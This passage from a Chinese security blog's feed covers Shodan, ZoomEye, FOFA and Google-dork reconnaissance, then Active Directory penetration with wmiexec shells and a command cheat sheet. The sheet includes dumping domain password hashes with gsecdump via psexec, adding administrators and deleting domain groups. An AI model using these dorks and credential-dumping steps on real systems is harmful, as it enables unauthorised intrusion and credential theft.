e)</span><br></pre></td></tr></table></figure><p>这里 Shodan.search() 会返回类似如下格式的 JSON 数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">         &#39;total&#39;: 8669969,</span><br><span class="line">         &#39;matches&#39;: [</span><br><span class="line">                 &#123;</span><br><span class="line">                         &#39;data&#39;: &#39;HTTP&#x2F;1.0 200 OK\r\nDate: Mon, 08 Nov 2010 05:09:59 GMT\r\nSer...&#39;,</span><br><span class="line">                         &#39;hostnames&#39;: [&#39;pl4t1n.de&#39;],</span><br><span class="line">                         &#39;ip&#39;: 3579573318,</span><br><span class="line">                         &#39;ip_str&#39;: &#39;89.110.147.239&#39;,</span><br><span class="line">                         &#39;os&#39;: &#39;FreeBSD 4.4&#39;,</span><br><span class="line">                         &#39;port&#39;: 80,</span><br><span class="line">                         &#39;timestamp&#39;: &#39;2014-01-15T05:49:56.283713&#39;</span><br><span class="line">                 &#125;,</span><br><span class="line">                 ...</span><br><span class="line">         ]</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/20144/script.png" alt></p><p><strong>常用shodan库函数</strong></p><ul><li>shodan.Shodan(key) ：初始化连接API</li><li>Shodan.count(query, facets=None)：返回查询结果数量</li><li>Shodan.host(ip, history=False)：返回一个IP的详细信息</li><li>Shodan.ports()：返回Shodan可查询的端口号</li><li>Shodan.protocols()：返回Shodan可查询的协议</li><li>Shodan.services()：返回Shodan可查询的服务</li><li>Shodan.queries(page=1, sort=’timestamp’, order=’desc’)：查询其他用户分享的查询规则</li><li>Shodan.scan(ips, force=False)：使用Shodan进行扫描，ips可以为字符或字典类型</li><li>Shodan.search(query, page=1, limit=None, offset=None, facets=None, minify=True)：查询Shodan数据</li></ul><h1 id="0x01-ZoomEye"><a href="#0x01-ZoomEye" class="headerlink" title="0x01 ZoomEye"></a>0x01 ZoomEye</h1><p>Zoomeye众所周知国内比较比较好的网络空间搜索引擎，相比shodan更侧重于web层面，指纹识别、web容器一类的zoomeye当之无愧。<br><a href="https://www.zoomeye.org" target="_blank" rel="noopener">钟馗之眼</a><br><img src="/posts/20144/2.png" alt></p><h2 id="常用语法"><a href="#常用语法" class="headerlink" title="常用语法"></a>常用语法</h2><ol><li><p>搜索指定组件及版本</p><p>app: 组件版本<br>ver: 组件版本<br>例如，搜索Apache组件版本2.4</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app:apache ver:2.4</span><br></pre></td></tr></table></figure></li><li><p>搜索指定端口</p><p>port： 端口号</p><p>例如，搜索开发了ssh端口的主机</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">port:22</span><br></pre></td></tr></table></figure></li><li><p>搜索指定操作系统</p><p>OS: 操作系统</p><p>例如，搜索Linux操作系统</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OS:Linux</span><br></pre></td></tr></table></figure></li><li><p>搜索指定服务</p><p>service: 服务名称</p><p>例如，搜索ssh服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service:ssh</span><br></pre></td></tr></table></figure></li><li><p>搜索指定地理位置</p><p>country: 国家<br>city: 城市</p><p>例如，搜索中国，郑州</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">country: China city:Zhengzhou</span><br></pre></td></tr></table></figure></li><li><p>搜索指定CIDR网段</p><p>CIDR: 网段</p><p>例如，搜索192.168.220.0/24</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTDR:192.168.220.0&#x2F;24</span><br></pre></td></tr></table></figure></li><li><p>搜索指定网站域名</p><p>site: 网站域名</p><p>例如，搜索百度</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:www.baidu.com</span><br></pre></td></tr></table></figure></li><li><p>搜索指定主机名</p><p>hostname:jw.zut.edu.cn</p><p>例如，搜索jw.zut.edu.cn</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hostname:jw.zut.edu.cn</span><br></pre></td></tr></table></figure></li><li><p>搜索指定设备名</p><p>device:设备名</p><p>例如，搜索路由器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">device:router</span><br></pre></td></tr></table></figure></li><li><p>搜索具有特定首页关键词的主机</p><p>keyword:关键词</p><p>例如，搜索关键词security</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyword:security</span><br></pre></td></tr></table></figure><h2 id="结果栗子"><a href="#结果栗子" class="headerlink" title="结果栗子"></a>结果栗子</h2></li></ol><p>搜索位于美国、主机系统为Linux、开启SSH服务的目标主机：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">country:US OS:Linux service:ssh</span><br></pre></td></tr></table></figure><h1 id="0x02-FOFA"><a href="#0x02-FOFA" class="headerlink" title="0x02 FOFA"></a>0x02 FOFA</h1><p>国内漏洞查询和资产收集比较好的一款搜索引擎，与其他搜索引擎都大同小异，功能差别不是太大。<br><img src="/posts/20144/3.png" alt></p><h2 id="常用语法-1"><a href="#常用语法-1" class="headerlink" title="常用语法"></a>常用语法</h2><p>直接输入查询语句，将从标题、html内容、http头信息、url字段中搜索。</p><ul><li>title=”abc”   从标题中搜索abc</li><li>header=”abc”  从http头中搜索abc</li><li>body=”abc”    从html正文中搜索abc</li><li>domain=”abc.com”   搜索根域名带有abc.com的网站</li><li>host=”.edu.cn”    从url中搜索.edu.cn，注意搜索要用host作为名称</li><li>port=”443”     查找对应端口443的资产</li><li>ip=”1.1.1.1”    从ip中搜索包含1.1.1.1的网站，注意搜索要用ip作为名称   </li><li>country=”CN”    搜索指定国家(编码)的资产 </li></ul><p>注意： <code>==</code> 符号是完全匹配，加快搜索时间 <code>&amp;&amp;</code> 之类的逻辑符都可以用，搜索语法类似Google！</p><p>更多详细内容查看: <a href="https://fofa.so/help" target="_blank" rel="noopener">FOFA帮助文档</a></p><h2 id="举个栗子"><a href="#举个栗子" class="headerlink" title="举个栗子"></a>举个栗子</h2><p>目录遍历</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title&#x3D;&quot;index of&quot;</span><br></pre></td></tr></table></figure><p><img src="/posts/20144/11.png" alt></p><h1 id="0x03-Google-Hacking"><a href="#0x03-Google-Hacking" class="headerlink" title="0x03 Google Hacking"></a>0x03 Google Hacking</h1><h2 id="常用语法-2"><a href="#常用语法-2" class="headerlink" title="常用语法"></a>常用语法</h2><ul><li>intext: 把网页中的正文内容中的某个字符作为搜索的条件</li><li>intitle: 把网页标题中的某个字符作为搜索的条件</li><li>cache: 搜索搜索引擎里关于某些内容的缓存，可能会在过期内容中发现有价值的信息</li><li>filetype: 指定一个格式类型的文件作为搜索对象</li><li>inurl: 搜索包含指定字符的url</li><li>site: 在指定的站点搜索相关内容</li><li>引号 “” : 把关键字打上引号后把引号部分作为整体来搜索</li><li>or： 同时搜索两个或更多的关键字</li><li>link： 搜索某个网站的链接</li></ul><h2 id="典型用法"><a href="#典型用法" class="headerlink" title="典型用法"></a>典型用法</h2><ol><li><p>找后台地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">site:xxx.com intext:管理|后台|登录|用户名|密码|系统|账号</span><br><span class="line">site:xxx.com inurl:login&#x2F;admin&#x2F;manage&#x2F;manager&#x2F;admin_login&#x2F;system</span><br><span class="line">site:xxx.com intitle:管理|后台|登录</span><br></pre></td></tr></table></figure></li><li><p>找上传类漏洞地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">site:xxx.com inurl:file</span><br><span class="line">site:xxx.com inurl:upload</span><br></pre></td></tr></table></figure></li><li><p>找注入页面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:xxx.com inurl:php?id&#x3D;</span><br></pre></td></tr></table></figure></li><li><p>找编辑器页面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:xxx.com inurl:ewebeditor</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;0x00-Shodon&quot;&gt;&lt;a href=&quot;#0x00-Shodon&quot; class=&quot;headerlink&quot; title=&quot;0x00 Shodon&quot;&gt;&lt;/a&gt;0x00 Shodon&lt;/h1&gt;&lt;p&gt;Shodon可以进行全球的设备搜索，物联天下，shodan第一。&lt;/
      
    
    </summary>
    
    
    
      <category term="Web" scheme="http://mysecroad.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>Active_Directory</title>
    <link href="http://mysecroad.github.io/posts/35642.html"/>
    <id>http://mysecroad.github.io/posts/35642.html</id>
    <published>2019-09-15T10:18:36.000Z</published>
    <updated>2020-04-26T09:24:33.101Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Active-Directory-活动目录"><a href="#Active-Directory-活动目录" class="headerlink" title="Active Directory(活动目录)"></a>Active Directory(活动目录)</h1><p><strong>Active Directory</strong>（简称AD。）是微软Windows Server中，负责架构中大型网路环境的集中式目录管理服务（Directory Services），在Windows 2000 Server开始内建于Windows Server产品中，它处理在组织中的网路物件，物件可以是使用者，群组，电脑，网域控制站，邮件，设定档，组织单元，树系等等，只要是在Active Directory结构定义档（schema）中定义的物件，就可以储存在Active Directory资料档中，并利用Active Directory Service Interface来存取。</p><h2 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h2><p>Active Directory(AD)以树状的资料结构来组成网路服务的资讯，在简单的网路环境中（例如小公司），通常网域都只有一个，在中型或大型的网路中，网域可能会有很多个，或是和其他公司或组织的AD相互连结（此连结称为信任关系）。</p><p><img src="/posts/35642/1.png" alt></p><h3 id="物件"><a href="#物件" class="headerlink" title="物件"></a>物件</h3><p>Active Directory的最小储存单元为物件（object），每个物件均有自己的schema属性，可以储存不同的资料，像是使用者、群组、电脑、信箱或其他的基本物件等。</p><p>一个网域底下的基本物件有：</p><ul><li>Domain Controllers，储存网域所属的网域控制站（简称DC、域控）。</li><li>Computers，储存加入网域的电脑物件。</li><li>Builtin，储存内建的帐户群组。</li><li>Users，储存AD中的使用者物件。</li></ul><p>域与活动目录的关系：</p><ul><li>域是一种逻辑的组织形式；</li><li>活动目录是实现域的方法</li><li>活动目录是域的基础</li></ul><h2 id="WMIEXEC"><a href="#WMIEXEC" class="headerlink" title="WMIEXEC"></a>WMIEXEC</h2><p>内网渗透中经常用到psexec这个工具，可以很方便的得到一个半交互式的cmd shell。</p><p>psexec 首次执行需要验证，这在Shell中使用起来非常不便，可以使用如下命令，避免出面上述问题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec &#x2F;accepteula</span><br></pre></td></tr></table></figure><p>但是psexec也有一些问题：psexec需要对方开启ADMIN$共享，而且需要安装服务，安装服务会留下明显的日志；另外，psexec退出时有可能服务删除失败。</p><p>WMI可以远程执行命令可以用VBS脚本调用WMI来模拟psexec的功能。</p><p><img src="/posts/35642/2.png" alt></p><p>WMIEXEC支持两种模式，一种是半交互式shell模式，另一种是执行单条命令模式。</p><p>WMIEXEC需要提供账号密码进行远程连接，但是如果没有破解出账号密码，也可以配合WCE的hash注入功能一起使用，先进行hash注入，然后再使用WMIEXEC即可。</p><p><strong>半交互式shell模式</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript.exe &#x2F;&#x2F;nologo wmiexec.vbs &#x2F;shell 192.168.72.14 username password</span><br></pre></td></tr></table></figure><p><img src="/posts/35642/3.png" alt></p><p><strong>单个命令执行的模式</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript.exe wmiexec.vbs &#x2F;cmd 192.168.1.1 username password &quot;command&quot;</span><br></pre></td></tr></table></figure><p><img src="/posts/35642/4.png" alt></p><p>下载地址： <a href="http://www.secpulse.com/wp-content/uploads/2015/05/cache-a360611dc24d240989799c29c555e4b7_wmiexec-v1_1.rar" target="_blank" rel="noopener">wmiexec v1.1.rar</a></p><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><table><thead><tr><th align="center">命令</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">echo</td><td align="center">查看系统版本位数</td></tr><tr><td align="center">set</td><td align="center">查看系统环境变量</td></tr><tr><td align="center">netstat -ano</td><td align="center">查看开放端口</td></tr><tr><td align="center">ipconfig /all</td><td align="center">查询本机IP段，所在域等</td></tr><tr><td align="center">net config Workstation</td><td align="center">当前计算机名，全名，用户名，系统版本，工作站域，登陆域</td></tr><tr><td align="center">net user</td><td align="center">本机用户列表</td></tr><tr><td align="center">net localhroup administrators</td><td align="center">本机管理员[通常含有域用户]</td></tr><tr><td align="center">net user /domain</td><td align="center">查询域用户</td></tr><tr><td align="center">net user 用户名 /domain</td><td align="center">获取指定用户的账户信息</td></tr><tr><td align="center">net user /domain b404 pass</td><td align="center">修改域内用户密码，需要管理员权限</td></tr><tr><td align="center">net group /domain</td><td align="center">查询域里面的工作组</td></tr><tr><td align="center">net group 组名 /domain</td><td align="center">查询域中的某工作组</td></tr><tr><td align="center">net group “domain admins” /domain</td><td align="center">查询域管理员列表</td></tr><tr><td align="center">net group “enterprise admins” /domain</td><td align="center">获得企业管理员列表</td></tr><tr><td align="center">net group 组名 /del /domain</td><td align="center">删除域中的某组</td></tr><tr><td align="center">net group 组名 组成员名 /del /domain</td><td align="center">删除域中的某组的组成员</td></tr><tr><td align="center">net localgroup administrators /domain</td><td align="center">登录本机的域管理员</td></tr><tr><td align="center">net group 组名 /add</td><td align="center">增加域中的组</td></tr><tr><td align="center">net localgroup administrators workgroup\user001 /add</td><td align="center">域用户添加到本机</td></tr><tr><td align="center">net group “domain controllers” /domain</td><td align="center">查看域控制器(如果有多台)</td></tr><tr><td align="center">net time /domain</td><td align="center">判断主域，主域服务器都做时间服务器</td></tr><tr><td align="center">net session</td><td align="center">查看当前会话</td></tr><tr><td align="center">net use \ip\ipc$ pawword /user:username@domain</td><td align="center">建立IPC会话[空连接-***]</td></tr><tr><td align="center">net view</td><td align="center">查询同一域内机器列表</td></tr><tr><td align="center">net view /domain</td><td align="center">查询域列表</td></tr><tr><td align="center">net view \ip</td><td align="center">查询某IP共享</td></tr><tr><td align="center">net view /domain:test</td><td align="center">查看test域中计算机列表</td></tr><tr><td align="center">net view \DC的机器名字</td><td align="center">查看域控共享情况</td></tr><tr><td align="center">net use z: \192.168.200.21\文件夹名</td><td align="center">建立映射到本机Z盘</td></tr><tr><td align="center">net share</td><td align="center">查看SMB指向的路径[即共享]</td></tr><tr><td align="center">at \192.168.200.21:50 c:\windows\xx.exe</td><td align="center">在共享主机上执行</td></tr><tr><td align="center">nltest /domain_trusts</td><td align="center">获取域信任信息</td></tr><tr><td align="center">net start</td><td align="center">查看当前运行的服务</td></tr><tr><td align="center">net time /domain</td><td align="center">查询主域服务器的时间</td></tr><tr><td align="center">net time \192.168.200.21</td><td align="center">查看192.168.200.21机器的时间</td></tr><tr><td align="center">echo %logonserver%</td><td align="center">查看登陆到这台服务器的计算机</td></tr><tr><td align="center">net accounts</td><td align="center">查看本地密码策略</td></tr><tr><td align="center">nbtstat –A ip</td><td align="center">netbios 查询</td></tr><tr><td align="center">netstat –an/ano/anb</td><td align="center">网络连接查询</td></tr><tr><td align="center">netsh firewall show config</td><td align="center">查看防火墙策略</td></tr><tr><td align="center">netsh firewall show state</td><td align="center">查看防火墙策略</td></tr><tr><td align="center">route print</td><td align="center">路由表</td></tr><tr><td align="center">tracert IP</td><td align="center">路由跟踪</td></tr><tr><td align="center">arp -a</td><td align="center">列出本网段内所有活跃的IP地址</td></tr><tr><td align="center">arp -s (ip + mac)</td><td align="center">绑定mac和IP</td></tr><tr><td align="center">arp -d (iP + mac)</td><td align="center">解绑IP和Mac</td></tr><tr><td align="center">tasklist /V</td><td align="center">查看进程[显示对应用户]</td></tr><tr><td align="center">tasklist /S ip /U domain\username /P /V</td><td align="center">查看远程计算机进程列表</td></tr><tr><td align="center">psexec \192.168.200.21 -u administrator -p b404pass -c gsecdump.exe -u</td><td align="center">从域服务器密码存储文件windows/ntds/ntds.dit导出hash值出来</td></tr><tr><td align="center">gsecdump -a</td><td align="center">获取域登管理员登录过得hash值，这里gescdump为第三方导出AD域的hash值</td></tr><tr><td align="center">tasklist /S IP地址 /U 域名\用户名 /P /V</td><td align="center">查看远程计算机进程</td></tr><tr><td align="center">tasklist /svc</td><td align="center">查看进程</td></tr><tr><td align="center">taskkill /im 进程名称(cmd.exe)</td><td align="center">结束进程</td></tr><tr><td align="center">taskkill /pid[进程码]</td><td align="center">-t(结束该进程) -f(强制结束该进程以及所有子进程)</td></tr><tr><td align="center">ping 主机名</td><td align="center">显示IP</td></tr><tr><td align="center">qprocess *</td><td align="center">类似tasklist</td></tr><tr><td align="center">qprocess /SERVER:IP</td><td align="center">远程查看计算机进程列表</td></tr><tr><td align="center">nslookup –qt-MX Yahoo.com</td><td align="center">查看邮件服务器</td></tr><tr><td align="center">whoami /all</td><td align="center">查询当前用户权限等</td></tr><tr><td align="center">systeminfo</td><td align="center">查看系统信息</td></tr><tr><td align="center">qwinsta</td><td align="center">查看登录情况</td></tr><tr><td align="center">qwinsta /SERVER:IP</td><td align="center">查看远程登录情况</td></tr><tr><td align="center">fsutil fsinfo drives</td><td align="center">查看所有盘符</td></tr><tr><td align="center">gpupdate /force</td><td align="center">更新域策略</td></tr></tbody></table><p><strong>dsquery的AD查询工具</strong></p><table><thead><tr><th align="center">命令</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">dsquery user domainroot -limit 65535 &amp;&amp; net user /domain</td><td align="center">列出该域内所有用户名</td></tr><tr><td align="center">dsquery contact</td><td align="center">寻找目录中的联系人</td></tr><tr><td align="center">dsquery subnet</td><td align="center">列出该域内网段划分</td></tr><tr><td align="center">query user</td><td align="center">查询那些用户在线</td></tr><tr><td align="center">dsquery group &amp;&amp; net group /domain</td><td align="center">列出该域内分组</td></tr><tr><td align="center">dsquery ou</td><td align="center">列出该域内组织单位</td></tr><tr><td align="center">dsquery server &amp;&amp; net time /domain</td><td align="center">列出该域内域控制器</td></tr><tr><td align="center">dsquery site -o rdn</td><td align="center">搜索域中所有站点的名称</td></tr><tr><td align="center">psloggedon.exe</td><td align="center">查询那台主机和用户登录到该主机上</td></tr><tr><td align="center">netsess.exe //192.168.1.115</td><td align="center">远程主机上无需管理员权限,查询到主机名和用户</td></tr><tr><td align="center">reg query “HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\TERMINAL SERVERCLIENT\DEFAULT”</td><td align="center">获取最近mstsc登录的记录</td></tr></tbody></table><p>更多命令查看： <a href="https://www.t00ls.net/articles-39285.html" target="_blank" rel="noopener">《内网命令大全》</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Active-Directory-活动目录&quot;&gt;&lt;a href=&quot;#Active-Directory-活动目录&quot; class=&quot;headerlink&quot; title=&quot;Active Directory(活动目录)&quot;&gt;&lt;/a&gt;Active Directory(活动目录)
      
    
    </summary>
    
    
    
  </entry>
  
</feed>
